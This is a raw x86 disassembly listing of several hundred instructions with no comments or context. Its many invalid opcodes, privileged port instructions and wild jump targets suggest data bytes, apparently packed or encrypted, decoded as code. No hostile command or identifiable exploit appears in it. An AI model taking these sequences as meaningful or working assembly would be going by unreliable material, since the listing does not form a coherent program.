  42770b:	inc    eax
  42770c:	and    DWORD PTR [ebp-0x5],esi
  42770f:	out    dx,al
  427710:	xchg   BYTE PTR [edi],al
  427712:	push   0x1888b5
  427717:	pop    edi
  427718:	pop    esi
  427719:	add    BYTE PTR [ebp-0x1b],0x8b
  42771d:	or     DWORD PTR [bp+si],ecx
  427720:	imul   esi,DWORD PTR [esp+eax*4-0x4b],0x76d97b60
  427728:	pop    ebx
  427729:	jmp    DWORD PTR [ecx-0x4c]
  42772c:	push   ss
  42772d:	outs   dx,DWORD PTR ds:[esi]
  42772e:	or     BYTE PTR [ebx-0x66],bl
  427731:	mov    edx,0xcc56dee
  427736:	das    
  427737:	mov    dl,0x79
  427739:	(bad)  
  42773a:	jg     0x42773c
  42773c:	add    BYTE PTR [eax],al
  42773e:	add    BYTE PTR [eax],al
  427740:	jne    0x42779d
  427742:	je     0x427759
  427744:	xor    DWORD PTR [esi-0x41],ecx
  427747:	push   ecx
  427749:	fld    QWORD PTR [esi-0x6afb6dc8]
  427750:	xor    BYTE PTR [ebp+ebx*8+0x38],ch
  427754:	cmp    BYTE PTR [edx-0x1becfa16],cl
  42775a:	mov    ecx,0xba52dbd6
  42775f:	out    dx,al
  427760:	loope  0x4277b8
  427762:	mov    ch,0x1
  427764:	cmc    
  427765:	pop    edx
  427766:	inc    DWORD PTR [ebp+0x4d8993b0]
  42776c:	inc    ebp
  42776d:	in     eax,0x4e
  42776f:	adc    BYTE PTR [edx+eax*1-0x18],0x83
  427774:	and    eax,DWORD PTR [ebx]
  427776:	pop    ds
  427777:	dec    edx
  427778:	shl    DWORD PTR [eax],0x6d
  42777b:	dec    edx
  42777c:	test   eax,0x6d4b1613
  427781:	mov    bh,0xd5
  427783:	add    al,0x9
  427785:	inc    ebx
  427786:	mov    al,0x80
  427788:	adc    al,0x0
  42778a:	inc    dx
  42778c:	adc    ebx,DWORD PTR [edx+ebx*8+0x30]
  427790:	cmp    al,0x2a
  427792:	mov    ah,0x10
  427794:	outs   dx,BYTE PTR ds:[esi]
  427795:	mov    gs,WORD PTR [eax]
  427797:	retf   0x637b
  42779a:	in     eax,0x80
  42779c:	mov    ah,0xfd
  42779e:	fnsave [edx-0xd]
  4277a1:	mov    dh,0xf8
  4277a3:	mov    BYTE PTR [eax],al
  4277a5:	add    BYTE PTR [eax],al
  4277a7:	add    BYTE PTR [eax],al
  4277a9:	lds    eax,FWORD PTR [ecx+0x645aff08]
  4277af:	in     eax,dx
  4277b0:	cmp    DWORD PTR [ebx-0x43803d13],edi
  4277b6:	in     eax,dx
  4277b7:	div    DWORD PTR [esi]
  4277b9:	lods   al,BYTE PTR ds:[esi]
  4277ba:	sub    DWORD PTR [edi+edx*1],ebp
  4277bd:	outs   dx,BYTE PTR ds:[esi]
  4277be:	mov    gs,WORD PTR [eax-0x309ccc43]
  4277c4:	xchg   DWORD PTR [ecx+edi*8+0x3b5203cd],esi
  4277cb:	add    ecx,eax
  4277cd:	imul   edi,ecx,0x5c
  4277d0:	inc    ebp
  4277d1:	cmp    al,0x85
  4277d3:	enter  0xa78,0x43
  4277d7:	stc    
  4277d8:	inc    BYTE PTR [ebp-0xa8bd385]
  4277de:	(bad)  
  4277df:	out    0x27,eax
  4277e1:	jae    0x42780d
  4277e3:	mov    eax,ds:0xa9337af8
  4277e8:	mov    BYTE PTR [eax+edi*8],ch
  4277eb:	push   esp
  4277ec:	inc    esp
  4277ed:	lods   eax,DWORD PTR ds:[esi]
  4277ee:	add    DWORD PTR [eax],0xffffff89
  4277f1:	(bad)  
  4277f3:	mov    edi,0xf2584a29
  4277f8:	lods   al,BYTE PTR ds:[esi]
  4277f9:	(bad)  
  4277fa:	cli    
  4277fb:	jae    0x4277ed
  4277fd:	sbb    al,dh
  4277ff:	and    BYTE PTR [edi],0x79
  427802:	cli    
  427803:	(bad)  
  427804:	call   0x3987ea50
  427809:	mov    esi,ebp
  42780b:	or     bl,dl
  42780d:	add    BYTE PTR [eax],al
  42780f:	add    BYTE PTR [eax],al
  427811:	add    BYTE PTR [esi+0xee9ca81],bl
  427817:	push   0xff288efb
  42781c:	mov    WORD PTR [esi+eax*4-0x515b732e],gs
  427823:	shl    bh,cl
  427825:	aaa    
  427826:	xor    ebp,DWORD PTR [edx-0x5]
  427829:	fisubr WORD PTR [edi]
  42782b:	mov    esi,0xfcc69eee
  427830:	mov    dl,0xa4
  427832:	popa   
  427833:	rol    BYTE PTR [esi+0x880d2ac],cl
  427839:	bound  ebp,QWORD PTR [edi]
  42783b:	imul   edx,DWORD PTR [eax+0x1],0x20
  42783f:	clc    
  427840:	cld    
  427841:	fiadd  WORD PTR [edi+0x7f]
  427844:	jge    0x427827
  427846:	into   
  427847:	daa    
  427848:	jae    0x42783c
  42784a:	jbe    0x42782c
  42784c:	add    dh,BYTE PTR [ebp+ebp*4-0x6d]
  427850:	push   eax
  427851:	ror    DWORD PTR [ecx*4+0x42fab6fb],1
  427858:	or     esp,DWORD PTR [ebp-0x34]
  42785b:	push   0xe5f6e9fb
  427860:	xchg   ebx,eax
  427861:	jmp    0xe70305dd
  427866:	sub    al,0x42
  427868:	push   eax
  427869:	bound  edi,QWORD PTR ds:0xfc008794
  42786f:	out    0xc7,eax
  427871:	rol    DWORD PTR ds:0xe28113,0x0
  427878:	add    BYTE PTR [eax],al
  42787a:	add    BYTE PTR [ebx+eax*1-0x9],bl
  42787e:	add    BYTE PTR [edi-0x32],dl
  427881:	or     al,0x8d
  427884:	fimul  WORD PTR [edi]
  427886:	and    eax,0xfffff44c
  42788b:	pop    ss
  42788c:	sub    eax,DWORD PTR [ebx-0x1f41b7bb]
  427892:	or     BYTE PTR [ebp-0x3b],cl
  427895:	pop    es
  427896:	or     edi,DWORD PTR [ebp-0x18]
  427899:	pop    es
  42789a:	(bad)  
  42789b:	in     al,dx
  42789c:	push   cs
  42789d:	jmp    0xf736d15b
  4278a2:	mov    ebx,ecx
  4278a4:	push   0x63
  4278a6:	inc    eax
  4278a7:	jecxz  0x4278a0
  4278a9:	jmp    FWORD PTR [ecx-0x2b]
  4278ac:	add    DWORD PTR [ebp-0x34],0x958ccb2c
  4278b3:	jnp    0x4278a9
  4278b5:	add    eax,0xffffffcb
  4278b8:	jle    0x427917
  4278ba:	add    bl,ah
  4278bc:	add    bl,BYTE PTR [esi-0x3f]
  4278bf:	adc    edx,eax
  4278c1:	pop    es
  4278c2:	or     ax,0xc63f
  4278c6:	or     BYTE PTR [edx],dh
  4278c8:	ret    
  4278c9:	inc    esp
  4278ca:	rcl    DWORD PTR [eax+ebx*2+0x65ef45c0],1
  4278d1:	jnp    0x427950
  4278d3:	call   0xccd77fd5
  4278d8:	sub    al,0xc9
  4278da:	xor    ecx,ebx
  4278dc:	in     eax,0x44
  4278de:	int3   
  4278df:	add    BYTE PTR [eax],al
  4278e1:	add    BYTE PTR [eax],al
  4278e3:	add    BYTE PTR [ebp+0x7676f3a7],al
  4278e9:	in     eax,0x44
  4278eb:	in     al,dx
  4278ec:	movsx  edi,dh
  4278ef:	gs jne 0x427944
  4278f2:	mov    bh,0xf9
  4278f4:	loopne 0x427954
  4278f6:	jmp    0xf6a9e633
  4278fb:	inc    edx
  4278fc:	neg    BYTE PTR [ebx-0xc2fc909]
  427902:	icebp  
  427903:	jmp    0x427893
  427905:	push   esi
  427906:	addr16 jne 0x427965
  427909:	fadd   st(2),st
  42790b:	imul   esi
  42790d:	xchg   esi,eax
  42790e:	addr16 addr16 cmp al,0x63
  427912:	jp     0x427989
  427914:	sbb    esp,eax
  427916:	ins    BYTE PTR es:[edi],dx
  427917:	dec    eax
  427918:	and    edi,DWORD PTR [ebp-0x20953f79]
  42791e:	ins    DWORD PTR es:[edi],dx
  42791f:	add    DWORD PTR [ebp+0x5b],esi
  427922:	fdiv   st(2),st
  427924:	jl     0x42797e
  427926:	jmp    0x2945:0x7a728feb
  42792d:	lods   al,BYTE PTR ds:[esi]
  42792e:	fsub   st,st(7)
  427930:	shl    BYTE PTR [edx+0x43dcfb71],cl
  427936:	imul   edi,ebx,0xffffffe2
  427939:	xchg   ebx,eax
  42793a:	mov    edi,0xdd5b7e72
  42793f:	add    dl,dl
  427941:	out    0xf6,al
  427943:	out    0xfb,eax
  427945:	into   
  427946:	jo     0x427943
  427948:	add    BYTE PTR [eax],al
  42794a:	add    BYTE PTR [eax],al
  42794c:	add    cl,bh
  42794e:	fwait
  42794f:	add    BYTE PTR [ebp+eiz*4-0x10000a6],al
  427956:	into   
  427957:	sti    
  427958:	addr16 xor eax,0xf000ccc
  42795e:	pop    ecx
  42795f:	jp     0x4279a6
  427961:	xchg   ecx,eax
  427962:	or     ebx,DWORD PTR [ebp+eiz*8-0x17]
  427966:	lods   al,BYTE PTR ds:[esi]
  427967:	jo     0x4278ed
  427969:	mov    ch,0x44
  42796b:	xor    DWORD PTR [ebp+0x3e90274],0x6e
  427972:	lods   eax,DWORD PTR ds:[esi]
  427973:	sub    al,0x68
  427975:	repnz loope 0x42799c
  427978:	add    al,0xf2
  42797a:	inc    edx
  42797b:	les    esi,FWORD PTR [eax+0x75]
  42797e:	add    ch,cl
  427980:	inc    edx
  427981:	push   ebp
  427982:	cli    
  427983:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427984:	pop    edx
  427985:	jge    0x427980
  427987:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427988:	jmp    0xea633a8a
  42798d:	stc    
  42798e:	inc    ecx
  42798f:	repnz xchg edi,ebp
  427992:	add    ecx,ebp
  427994:	add    edi,DWORD PTR [esi-0x53]
  427997:	push   ecx
  427998:	inc    edx
  427999:	push   ss
  42799a:	add    BYTE PTR [esp+esi*8-0x4a],bl
  42799e:	jns    0x4279d2
  4279a0:	pop    ebx
  4279a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4279a2:	mov    edx,0x41f9703a
  4279a7:	loop   0x427930
  4279a9:	mov    WORD PTR [ebx],es
  4279ab:	jmp    0x9a0506b3
  4279b0:	or     al,0x0
  4279b2:	add    BYTE PTR [eax],al
  4279b4:	add    BYTE PTR [eax],al
  4279b6:	jne    0x427985
  4279b8:	sbb    DWORD PTR [ecx],edi
  4279ba:	cli    
  4279bb:	out    0xe0,al
  4279bd:	pop    ebx
  4279be:	add    al,0x8e
  4279c0:	or     dh,BYTE PTR [eax-0x7]
  4279c3:	inc    ecx
  4279c4:	xacquire xchg DWORD PTR [ebx+eax*1-0x17],edx
  4279c9:	add    edx,DWORD PTR [edx-0x21]
  4279cc:	fadd   DWORD PTR [ebx]
  4279ce:	call   0xe901:0xbe032f42
  4279d5:	in     eax,0x83
  4279d7:	shl    DWORD PTR [eax],0xf3
  4279da:	inc    eax
  4279db:	jns    0x4279c8
  4279dd:	(bad)  
  4279de:	out    0xb6,eax
  4279e0:	clc    
  4279e1:	inc    esp
  4279e2:	xchg   esp,eax
  4279e3:	jmp    FWORD PTR [edi-0x3f]
  4279e6:	xchg   edx,eax
  4279e7:	add    BYTE PTR [ecx+0x79747b],dh
  4279ed:	mov    ecx,0x62106030
  4279f2:	adc    DWORD PTR ds:0xf903f2f6,eax
  4279f8:	mov    cl,0x20
  4279fa:	jbe    0x427a3d
  4279fc:	loop   0x4279df
  4279fe:	mov    cl,0x5a
  427a00:	or     dl,ah
  427a02:	jmp    0x427a07
  427a04:	mov    esi,0x3179e6f2
  427a09:	jb     0x427a41
  427a0b:	rol    BYTE PTR [esi+0x4dcaefc],0x10
  427a12:	nop
  427a13:	test   BYTE PTR [ecx],0xdc
  427a16:	ja     0x427a91
  427a18:	inc    edi
  427a19:	lods   eax,DWORD PTR ds:[esi]
  427a1a:	add    BYTE PTR [eax],al
  427a1c:	add    BYTE PTR [eax],al
  427a1e:	add    BYTE PTR [ebx-0x5030f043],ah
  427a24:	mov    ch,0xf
  427a26:	(bad)  
  427a27:	dec    edi
  427a28:	mov    ebx,0x5be3bb47
  427a2d:	add    eax,0x677983
  427a32:	jmp    0x628e9dc6
  427a37:	inc    ecx
  427a38:	inc    ecx
  427a39:	loope  0x427a34
  427a3b:	jg     0x427aaf
  427a3d:	pop    ds
  427a3e:	sbb    ebp,esi
  427a40:	cmp    DWORD PTR [edi+0x8583019],eax
  427a46:	retf   0xf764
  427a49:	mov    cl,0x9a
  427a4b:	sbb    eax,DWORD PTR [ebx-0x1f]
  427a4e:	icebp  
  427a4f:	iret   
  427a50:	cmp    DWORD PTR [edi],eax
  427a52:	and    ecx,DWORD PTR [eax-0x45]
  427a55:	dec    edi
  427a56:	push   0x51
  427a58:	std    
  427a59:	je     0x427a6f
  427a5b:	imul   bl
  427a5d:	sbb    ebp,ecx
  427a5f:	mov    bl,0x7e
  427a61:	or     eax,0x68671bd2
  427a66:	in     eax,0x7a
  427a68:	add    al,BYTE PTR [eax]
  427a6a:	add    BYTE PTR [esi+0x66],al
  427a6d:	div    BYTE PTR ds:0x3b29cc
  427a73:	ret    
  427a74:	or     dl,ah
  427a76:	adc    cl,BYTE PTR [esi+edi*8-0x78]
  427a7a:	inc    ebx
  427a7b:	jo     0x427af6
  427a7d:	ror    BYTE PTR [edi],0xd9
  427a80:	(bad)  
  427a81:	icebp  
  427a82:	inc    DWORD PTR [eax]
  427a84:	add    BYTE PTR [eax],al
  427a86:	add    BYTE PTR [eax],al
  427a88:	add    eax,esi
  427a8a:	test   al,0x0
  427a8c:	dec    esp
  427a8d:	push   esi
  427a8f:	jae    0x427ae1
  427a91:	(bad)  
  427a92:	push   edi
  427a93:	dec    eax
  427a94:	rcl    ah,cl
  427a96:	jp     0x427afb
  427a98:	and    bh,bh
  427a9a:	call   0xf7174178
  427a9f:	push   0x126c0c
  427aa4:	inc    esi
  427aa5:	add    bh,dh
  427aa7:	jne    0x427abd
  427aa9:	(bad)  
  427aaa:	ss xchg esp,eax
  427aac:	mov    bl,0xd4
  427aae:	add    eax,0x23
  427ab1:	jnp    0x427a34
  427ab3:	add    BYTE PTR [edi+edi*8],bl
  427ab6:	cmp    BYTE PTR [ebp+0x14],0x47
  427aba:	cmp    esi,DWORD PTR [edi+0x27]
  427abd:	jmp    DWORD PTR [ecx+0x10]
  427ac0:	cmp    DWORD PTR [edx],0x8d8450af
  427ac6:	mov    edi,edi
  427ac8:	cmp    DWORD PTR [ebx-0x40],0x74
  427acc:	idiv   BYTE PTR [esi+0x7d]
  427acf:	mov    ah,0xac
  427ad1:	push   0x7
  427ad3:	adc    BYTE PTR [ecx-0x55],0x10
  427ad7:	je     0x427ab3
  427ad9:	jle    0x427b58
  427adb:	mov    ah,0xd4
  427add:	imul   edx,DWORD PTR [ebx-0x80],0x7400ad51
  427ae4:	outs   dx,BYTE PTR ds:[esi]
  427ae5:	pop    esp
  427ae6:	rol    BYTE PTR [ebp+0x75],0x91
  427aea:	cld    
  427aeb:	popa   
  427aec:	add    BYTE PTR [eax],al
  427aee:	add    BYTE PTR [eax],al
  427af0:	add    BYTE PTR [ebp+ebx*1-0x65ecf75a],dh
  427af7:	ret    
  427af8:	mov    ebx,0xb1ead97d
  427afd:	jne    0x427abe
  427aff:	adc    ecx,DWORD PTR [ebx]
  427b01:	call   0xc387f79e
  427b06:	in     eax,dx
  427b07:	ret    0xc5b3
  427b0a:	out    dx,al
  427b0b:	shl    BYTE PTR [eax],0xc5
  427b0e:	mov    cl,0xc3
  427b10:	mov    dl,0x74
  427b12:	add    DWORD PTR [edi],0x48
  427b15:	pop    ebx
  427b16:	mov    DWORD PTR [esi+0x45],esi
  427b19:	or     DWORD PTR [esp+ebx*2-0x40d30d01],ebp
  427b20:	call   0xfbaf50c1
  427b25:	mul    BYTE PTR [esi+0x13]
  427b28:	add    BYTE PTR [ecx-0x7e8a93a3],ch
  427b2e:	mov    eax,0xab879c12
  427b33:	jmp    esi
  427b35:	jb     0x427b6c
  427b37:	jmp    edi
  427b39:	retf   0x6da8
  427b3c:	sti    
  427b3d:	(bad)  
  427b3e:	sbb    al,0x5c
  427b40:	pop    edx
  427b41:	or     dh,BYTE PTR [ecx]
  427b43:	ins    DWORD PTR es:[edi],dx
  427b44:	sti    
  427b45:	xor    bh,0x5b
  427b48:	test   al,0x3a
  427b4a:	add    DWORD PTR [ebp-0x19],ebp
  427b4d:	and    esp,0xf830e870
  427b53:	ins    BYTE PTR es:[edi],dx
  427b54:	sti    
  427b55:	add    BYTE PTR [eax],al
  427b57:	add    BYTE PTR [eax],al
  427b59:	add    dh,cl
  427b5b:	push   esp
  427b5c:	ins    BYTE PTR es:[edi],dx
  427b5d:	jne    0x427b3c
  427b5f:	pusha  
  427b60:	repnz pop es
  427b62:	fstp   st(4)
  427b64:	jae    0x427b61
  427b66:	ret    0xcd90
  427b69:	push   esi
  427b6a:	lods   al,BYTE PTR ds:[esi]
  427b6b:	add    ah,BYTE PTR [edi+0x6db87513]
  427b71:	jae    0x427b63
  427b73:	pop    eax
  427b74:	pop    ebp
  427b75:	sar    eax,cl
  427b77:	or     BYTE PTR [ebp+0x43],ah
  427b7a:	and    ebp,ecx
  427b7c:	cmc    
  427b7d:	push   ecx
  427b7e:	push   ecx
  427b7f:	das    
  427b80:	xor    al,0x7
  427b82:	adc    eax,DWORD PTR [edi+ecx*1]
  427b85:	pop    ecx
  427b86:	jns    0x427ba6
  427b88:	(bad)  
  427b89:	div    BYTE PTR [ebp-0x38]
  427b8c:	outs   dx,BYTE PTR ds:[esi]
  427b8d:	std    
  427b8e:	mov    al,ds:0xa56a6942
  427b93:	fdivp  st(1),st
  427b95:	shl    dl,1
  427b97:	pop    ebx
  427b98:	shr    ah,1
  427b9a:	push   0xffffff95
  427b9c:	out    dx,eax
  427b9d:	jne    0x427bf9
  427b9f:	add    al,0xa8
  427ba1:	pop    ds
  427ba2:	test   eax,ecx
  427ba4:	pop    esi
  427ba5:	std    
  427ba6:	ret    0xb95b
  427ba9:	out    dx,al
  427baa:	push   ebx
  427bab:	mov    ebp,0x5a93a6c
  427bb0:	cmp    WORD PTR [ecx+edx*1-0x65],si
  427bb5:	inc    ebx
  427bb6:	daa    
  427bb7:	inc    esp
  427bb8:	out    0xf7,eax
  427bba:	je     0x427ba7
  427bbc:	sub    BYTE PTR [eax+eax*1+0x0],ch
  427bc0:	add    BYTE PTR [eax],al
  427bc2:	add    BYTE PTR [ebp+0x2],dh
  427bc5:	jmp    0x27cff245
  427bca:	int    0xc3
  427bcc:	jmp    0x427bae
  427bce:	retf   
  427bcf:	xor    al,0x9
  427bd1:	jmp    0x6df9afa3
  427bd6:	pop    edi
  427bd7:	push   0x6e
  427bd9:	stc    
  427bda:	jle    0x427c14
  427bdc:	push   edx
  427bdd:	mov    ecx,0xd8aa806c
  427be2:	ret    
  427be3:	ror    BYTE PTR [ebp+0x6a2573a4],cl
  427be9:	add    bl,ch
  427beb:	jbe    0x427bef
  427bed:	add    BYTE PTR [eax],ah
  427bef:	xor    eax,0xc8d586b7
  427bf4:	mov    cl,0x8c
  427bf6:	and    al,0x19
  427bf8:	mov    dl,0xfa
  427bfa:	pop    esp
  427bfb:	mov    eax,ds:0x806d155b
  427c00:	ret    0x71ff
  427c03:	mov    ah,0x58
  427c05:	xchg   DWORD PTR [ebx*1+0x76ebffe8],ebp
  427c0c:	add    cl,0x3
  427c0f:	cdq    
  427c10:	loopne 0x427ba3
  427c12:	cmp    DWORD PTR [ecx-0x7f],0xbe2cc8d1
  427c19:	stc    
  427c1a:	cmp    BYTE PTR [ecx+0x68],cl
  427c1d:	test   eax,0xc90271ec
  427c22:	stos   DWORD PTR es:[edi],eax
  427c23:	jne    0x427c27
  427c25:	push   ebp
  427c26:	jb     0x427c28
  427c28:	add    BYTE PTR [eax],al
  427c2a:	add    BYTE PTR [eax],al
  427c2c:	lods   eax,DWORD PTR ds:[esi]
  427c2d:	xchg   DWORD PTR [ebp-0x1b],eax
  427c30:	stc    
  427c31:	outs   dx,BYTE PTR ds:[esi]
  427c32:	or     bl,ch
  427c34:	jbe    0x427c38
  427c36:	dec    edi
  427c37:	mov    edi,0x302f51b3
  427c3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427c3d:	add    dl,BYTE PTR [eax]
  427c3f:	mov    esi,0x297ed012
  427c44:	jge    0x427bf8
  427c46:	cli    
  427c47:	mov    esp,0x41858f0e
  427c4c:	pushf  
  427c4d:	pop    ebx
  427c4e:	sti    
  427c4f:	cdq    
  427c50:	sahf   
  427c51:	pop    ss
  427c52:	dec    ecx
  427c53:	das    
  427c54:	mov    es,WORD PTR [ebp-0x77386240]
  427c5a:	jp     0x427c41
  427c5c:	imul   eax,ebx,0x7
  427c5f:	fs push ds
  427c61:	or     BYTE PTR [edi],ch
  427c63:	xor    cl,BYTE PTR [esi-0x4e]
  427c66:	add    eax,DWORD PTR [eax]
  427c68:	popa   
  427c69:	(bad)  
  427c6a:	jae    0x427c90
  427c6c:	inc    edi
  427c6d:	inc    ebx
  427c6e:	pop    es
  427c6f:	inc    DWORD PTR [eax]
  427c71:	mov    WORD PTR [ebp-0x9153b7b],cs
  427c77:	jmp    FWORD PTR [esi+edi*4-0x7]
  427c7b:	xor    ebx,ecx
  427c7d:	in     al,dx
  427c7e:	test   al,al
  427c80:	inc    eax
  427c81:	sti    
  427c82:	add    BYTE PTR [edi-0x6c],0xda
  427c86:	inc    esi
  427c87:	or     BYTE PTR [edi-0x15],bl
  427c8a:	dec    edi
  427c8b:	add    al,0x77
  427c8d:	into   
  427c8e:	imul   ebx,esp,0x0
  427c94:	add    BYTE PTR [esi],dh
  427c96:	(bad)  
  427c97:	pop    eax
  427c98:	push   ecx
  427c99:	retf   
  427c9a:	adc    dh,BYTE PTR [esp+edx*8]
  427c9d:	lahf   
  427c9e:	push   es
  427c9f:	not    DWORD PTR ds:0x3ff83c
  427ca5:	add    ecx,ebx
  427ca7:	adc    al,al
  427ca9:	iret   
  427caa:	jecxz  0x427ca1
  427cac:	sbb    DWORD PTR [eax*1+0x1d975e57],0xffffffba
  427cb4:	or     BYTE PTR [eax+ebx*1-0x40],cl
  427cb8:	inc    eax
  427cb9:	imul   esi
  427cbb:	div    BYTE PTR [eax+eax*4+0x5e]
  427cbf:	or     BYTE PTR [ecx+0x24],0xec
  427cc3:	jae    0x427ce9
  427cc5:	adc    al,0xe0
  427cc7:	add    bh,bh
  427cc9:	fcomp  QWORD PTR [edx+0x6]
  427ccc:	mov    dh,0x5c
  427cce:	aam    0xd7
  427cd0:	sbb    ebx,DWORD PTR [eax+ecx*4-0x20]
  427cd4:	dec    BYTE PTR [edi+0x14c1f9c3]
  427cda:	add    ebp,DWORD PTR [ebx]
  427cdc:	rcr    BYTE PTR [eax*8-0x1fddfff5],0xf0
  427ce4:	mov    esi,DWORD PTR [ebp-0x59]
  427ce7:	sti    
  427ce8:	ret    0xcd73
  427ceb:	jmp    0x3c30f22f
  427cf0:	je     0x427d65
  427cf2:	aam    0x3
  427cf4:	data16 je 0x427d4f
  427cf7:	push   cs
  427cf8:	lea    eax,[eax]
  427cfa:	add    BYTE PTR [eax],al
  427cfc:	add    BYTE PTR [eax],al
  427cfe:	sub    esp,DWORD PTR [ecx+0x57]
  427d01:	sbb    BYTE PTR [ecx+ebp*2-0x1],dh
  427d05:	icebp  
  427d06:	xor    DWORD PTR ds:0x6eba00fc,eax
  427d0c:	jg     0x427c99
  427d0e:	xor    eax,0x2b01eb69
  427d13:	xor    DWORD PTR [edi+0x45],esp
  427d16:	mov    ebx,DWORD PTR [edi-0x54dc3d83]
  427d1c:	add    BYTE PTR [eax],al
  427d1e:	out    dx,al
  427d1f:	cld    
  427d20:	pop    ds
  427d21:	add    al,0xc6
  427d23:	sbb    eax,0x7c9bd75c
  427d28:	imul   eax,DWORD PTR [ebp-0x53dffcb],0xe7f347e1
  427d32:	sar    dl,cl
  427d34:	gs sti 
  427d36:	(bad)  
  427d37:	mov    ds:0x98c9d77b,eax
  427d3c:	aam    0xfa
  427d3e:	pusha  
  427d3f:	pop    ss
  427d40:	adc    eax,0xc0d07540
  427d45:	psubb  mm4,QWORD PTR [edi+0x7a]
  427d49:	add    al,0x75
  427d4b:	imul   edi,edi,0xffffff8c
  427d4e:	mov    ds:0x53e7cf3f,al
  427d53:	scas   al,BYTE PTR es:[edi]
  427d54:	imul   edi,ebx,0xaf02bf1
  427d5a:	out    dx,al
  427d5b:	lods   al,BYTE PTR ds:[esi]
  427d5c:	ja     0x814a5fcd
  427d62:	add    BYTE PTR [eax],al
  427d64:	add    BYTE PTR [eax],al
  427d66:	add    dl,dh
  427d68:	add    ch,BYTE PTR [edx+0xe042513]
  427d6e:	cld    
  427d6f:	xor    ebp,DWORD PTR [edx+0x47]
  427d72:	mov    edi,0x43d75ddc
  427d77:	das    
  427d78:	mov    ecx,0x9a750026
  427d7d:	add    edx,DWORD PTR [edi+esi*4]
  427d80:	scas   al,BYTE PTR es:[edi]
  427d81:	es iret 
  427d83:	rep outs dx,BYTE PTR ds:[esi]
  427d85:	pushaw 
  427d87:	lods   eax,DWORD PTR ds:[esi]
  427d88:	adc    ebp,0x36425a1f
  427d8e:	sar    bl,cl
  427d90:	push   ebx
  427d91:	pusha  
  427d92:	mov    edi,0xbf5ff656
  427d97:	push   esi
  427d98:	cli    
  427d99:	outs   dx,DWORD PTR ds:[esi]
  427d9a:	mov    edi,0xbf6ffe56
  427d9f:	push   esi
  427da0:	sub    bl,BYTE PTR [esi-0x3f]
  427da3:	jbe    0x427d5a
  427da5:	pop    edi
  427da6:	mov    edi,0xac10f696
  427dab:	jb     0x427daf
  427dad:	jmp    0xe938635d
  427db2:	add    esi,DWORD PTR [esi]
  427db4:	mov    ah,0x13
  427db7:	sub    eax,0xfc0428d9
  427dbc:	aad    0xc4
  427dbe:	cmovge ebx,DWORD PTR [ebx-0x1d]
  427dc2:	add    esi,DWORD PTR [ebp-0x77]
  427dc5:	lods   al,BYTE PTR ds:[esi]
  427dc6:	and    eax,DWORD PTR [edx+0xd3e8c2]
  427dcc:	add    BYTE PTR [eax],al
  427dce:	add    BYTE PTR [eax],al
  427dd0:	das    
  427dd1:	pop    ss
  427dd2:	adc    eax,0x52026250
  427dd7:	push   eax
  427dd8:	loop   0x427dd9
  427dda:	out    0x3,eax
  427ddc:	jne    0x427e47
  427dde:	add    edi,DWORD PTR [ebp-0x41]
  427de1:	push   es
  427de2:	outs   dx,BYTE PTR ds:[esi]
  427de3:	add    dh,al
  427de5:	mov    ch,0xff
  427de7:	or     al,0x69
  427de9:	int3   
  427dea:	cli    
  427deb:	cdq    
  427dec:	repnz add al,0x9d
  427df0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427df1:	pop    ecx
  427df2:	je     0x427db9
  427df4:	jp     0x427d85
  427df6:	inc    esp
  427df7:	int    0x86
  427df9:	(bad)  
  427dfa:	dec    esp
  427dfb:	lds    edi,FWORD PTR [edx-0x75]
  427dfe:	inc    esp
  427dff:	int    0x72
  427e01:	push   0xffffffbc
  427e03:	mov    al,ds:0x31680276
  427e08:	mov    ecx,0xa631fb5c
  427e0d:	out    dx,eax
  427e0e:	(bad)  
  427e0f:	call   0xe94d2662
  427e14:	jbe    0x427dc8
  427e16:	cli    
  427e17:	sbb    al,0x65
  427e19:	ss aas 
  427e1b:	jmp    0xaa79af3b
  427e20:	test   DWORD PTR [edx-0x7c51e0a5],ebx
  427e26:	in     eax,0x14
  427e28:	ss mov al,0x86
  427e2b:	mov    eax,0x22c800b2
  427e30:	xor    DWORD PTR [ebx+eiz*8-0x7],ebx
  427e34:	add    BYTE PTR [eax],al
  427e36:	add    BYTE PTR [eax],al
  427e38:	add    BYTE PTR [esi+0x2],dh
  427e3b:	add    BYTE PTR [esi-0x183cffb5],dl
  427e41:	out    0xcf,al
  427e43:	aas    
  427e44:	jmp    0x7f86b8f7
  427e49:	fidivr DWORD PTR [eax+0x51be1fbe]
  427e4f:	sub    bh,0x2a
  427e52:	pop    esp
  427e53:	outs   dx,DWORD PTR ds:[esi]
  427e54:	add    edi,DWORD PTR [edx]
  427e56:	sub    eax,0x41b20fb
  427e5b:	jb     0x427e55
  427e5d:	lahf   
  427e5e:	rol    BYTE PTR [ebx],0x4e
  427e61:	inc    ebp
  427e62:	call   0xfff9:0x42f600e8
  427e69:	fld    TBYTE PTR [eax]
  427e6b:	jbe    0x427e75
  427e6d:	mov    esi,0x2aff56b4
  427e72:	pop    esp
  427e73:	jecxz  0x427e20
  427e75:	sbb    dh,ah
  427e77:	test   BYTE PTR [ebx-0x7d04a406],0xea
  427e7e:	push   edi
  427e7f:	sti    
  427e80:	pop    ebp
  427e81:	lahf   
  427e82:	dec    esp
  427e83:	xor    cl,0x5c
  427e86:	fs pop es
  427e88:	add    bl,ch
  427e8a:	fdivr  DWORD PTR [ebx+0x24]
  427e8d:	shr    BYTE PTR [ebx+0xd],1
  427e90:	mov    ebx,edx
  427e92:	pop    ebx
  427e93:	div    BYTE PTR [esp+edx*8]
  427e96:	mov    bh,0x87
  427e98:	inc    esp
  427e99:	ret    0x82e4
  427e9c:	inc    esi
  427e9d:	add    BYTE PTR [eax],al
  427e9f:	add    BYTE PTR [eax],al
  427ea1:	add    BYTE PTR [eax-0x6347db80],cl
  427ea7:	dec    esp
  427ea8:	or     dh,0xa4
  427eab:	add    al,BYTE PTR [eax]
  427ead:	add    BYTE PTR [esp+eax*2-0x773da7],cl
  427eb4:	add    BYTE PTR [eax+edi*2+0x2],0x4e
  427eb9:	push   edi
  427eba:	out    0xee,eax
  427ebc:	mov    WORD PTR [edi+0x58],?
  427ebf:	fadd   DWORD PTR ds:0x8386588d
  427ec5:	inc    edi
  427ec6:	push   esp
  427ec7:	fiadd  DWORD PTR [ebx]
  427ec9:	xor    DWORD PTR [edi],0xd10b69b6
  427ecf:	cdq    
